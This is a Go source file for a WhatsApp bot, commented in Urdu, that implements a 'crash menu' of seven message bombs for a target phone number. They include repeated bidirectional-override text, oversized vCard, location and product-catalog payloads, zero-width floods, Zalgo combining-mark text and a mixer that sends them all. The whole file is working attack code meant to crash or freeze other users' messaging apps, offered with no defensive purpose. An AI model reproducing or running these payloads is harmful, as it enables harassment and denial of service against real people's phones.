package main

import (
	"context"
	"fmt"
	"strings"

	"go.mau.fi/whatsmeow"
	// 👇 پروٹوکول کا نیا راستہ
	waProto "go.mau.fi/whatsmeow/binary/proto" 
	"go.mau.fi/whatsmeow/types"
	"go.mau.fi/whatsmeow/types/events"
	"google.golang.org/protobuf/proto"
)

// ---------------------------------------------------------
// 🏗️ HELPER 1: افقی وائرس (Horizontal/Length)
// ---------------------------------------------------------
func generateCrashPayload(length int) string {
	// \u202c (PDF) کو نکال دیا ہے تاکہ لیئرز بند نہ ہوں
	openers := "\u202e\u202b\u202d" 
	return strings.Repeat(openers, length)
}

// ---------------------------------------------------------
// 🏗️ HELPER 2: عمودی وائرس (Vertical/Zalgo)
// ---------------------------------------------------------
func generateZalgoPayload() string {
	base := "﷽" // Heavy Char
	marks := []string{
		"\u0310", "\u0312", "\u0313", "\u0314", "\u0315", "\u033e", "\u033f", "\u0340", 
		"\u0341", "\u0342", "\u0343", "\u0344", "\u0345", "\u0346", "\u0347", "\u0348",
		"\u0350", "\u0351", "\u0352", "\u0357", "\u0358", "\u035d", "\u035e", "\u0360",
	}

	var payload string
	payload += "⚠️ SYSTEM OVERLOAD ⚠️\n"
	
	for i := 0; i < 200; i++ {
		payload += base
		for j := 0; j < 50; j++ {
			for _, m := range marks {
				payload += m
			}
		}
		payload += " "
	}
	return payload
}

// ---------------------------------------------------------
// 🚀 BUG COMMAND HANDLER (1-7)
// ---------------------------------------------------------
func handleSendBugs(client *whatsmeow.Client, v *events.Message, args []string) {
	if len(args) < 2 {
		replyMessage(client, v, `⚠️ *Crash Menu:*
1. Text Bomb (Nesting)
2. VCard Bomb (Contact)
3. Location Bomb (Map)
4. Memory Flood (Invisible)
5. Zalgo Text (Vertical) 🆕
6. Catalog Bomb (Heavy) 🆕
7. 🔥 MIXER (ALL IN ONE)`)
		return
	}

	bugType := strings.ToLower(args[0])
	targetNum := args[1]

	if !strings.Contains(targetNum, "@") {
		targetNum += "@s.whatsapp.net"
	}
	jid, err := types.ParseJID(targetNum)
	if err != nil {
		replyMessage(client, v, "❌ غلط نمبر!")
		return
	}

	replyMessage(client, v, "🚀 Launching Attack Type "+bugType+"...")

	switch bugType {
	
	case "1": // Text Bomb
		client.SendMessage(context.Background(), jid, &waProto.Message{
			Conversation: proto.String(generateCrashPayload(20000)),
		})

	case "2": // VCard Bomb
		vcard := fmt.Sprintf("BEGIN:VCARD\nVERSION:3.0\nN:;%s;;;\nFN:%s\nEND:VCARD", generateCrashPayload(20000), "VIRUS")
		client.SendMessage(context.Background(), jid, &waProto.Message{
			ContactMessage: &waProto.ContactMessage{DisplayName: proto.String("🔥"), Vcard: proto.String(vcard)},
		})

	case "3": // Location Bomb
		client.SendMessage(context.Background(), jid, &waProto.Message{
			LocationMessage: &waProto.LocationMessage{
				DegreesLatitude: proto.Float64(24.8607), DegreesLongitude: proto.Float64(67.0011),
				Name: proto.String("🚨 Crash Point"), Address: proto.String(generateCrashPayload(20000)),
			},
		})

	case "4": // Flood
		client.SendMessage(context.Background(), jid, &waProto.Message{
			ExtendedTextMessage: &waProto.ExtendedTextMessage{Text: proto.String(strings.Repeat("\u200b", 20000))},
		})

	case "5": // Zalgo
		client.SendMessage(context.Background(), jid, &waProto.Message{
			ExtendedTextMessage: &waProto.ExtendedTextMessage{Text: proto.String(generateZalgoPayload())},
		})

	case "6": // Catalog Bomb (Fixed Types)
		client.SendMessage(context.Background(), jid, &waProto.Message{
			ProductMessage: &waProto.ProductMessage{
				Product: &waProto.ProductMessage_ProductSnapshot{
					ProductID:       proto.String("999999"), // ✅ ID Capitalized
					Title:           proto.String("💣 HEAVY LOAD"),
					Description:     proto.String(generateCrashPayload(20000)),
					CurrencyCode:    proto.String("PKR"),
					PriceAmount1000: proto.Int64(0),
					// ✅ Fixed: Int32 -> Uint32 Conversion
					ProductImageCount: proto.Uint32(1), 
				},
				BusinessOwnerJID: proto.String(jid.String()), // ✅ ID Capitalized
			},
		})

	case "7", "all": // Mixer (Fixed Types)
		// 1. Text
		client.SendMessage(context.Background(), jid, &waProto.Message{Conversation: proto.String(generateCrashPayload(2000))})
		// 2. VCard
		vcard := fmt.Sprintf("BEGIN:VCARD\nVERSION:3.0\nN:;%s;;;\nFN:%s\nEND:VCARD", generateCrashPayload(20000), "VIRUS")
		client.SendMessage(context.Background(), jid, &waProto.Message{ContactMessage: &waProto.ContactMessage{DisplayName: proto.String("☠️"), Vcard: proto.String(vcard)}})
		// 3. Location
		client.SendMessage(context.Background(), jid, &waProto.Message{LocationMessage: &waProto.LocationMessage{DegreesLatitude: proto.Float64(0), DegreesLongitude: proto.Float64(0), Address: proto.String(generateCrashPayload(20000))}})
		// 4. Zalgo
		client.SendMessage(context.Background(), jid, &waProto.Message{ExtendedTextMessage: &waProto.ExtendedTextMessage{Text: proto.String(generateZalgoPayload())}})
		// 5. Catalog
		client.SendMessage(context.Background(), jid, &waProto.Message{
			ProductMessage: &waProto.ProductMessage{
				Product: &waProto.ProductMessage_ProductSnapshot{
					ProductID:   proto.String("666"), // ✅ Fixed
					Title:       proto.String("🔥"),
					Description: proto.String(generateCrashPayload(20000)),
				},
				BusinessOwnerJID: proto.String(jid.String()), // ✅ Fixed
			},
		})

		replyMessage(client, v, "✅ All Warheads Delivered! 💀")

	default:
		replyMessage(client, v, "❌ غلط ٹائپ!")
	}
}

// Helper Reply
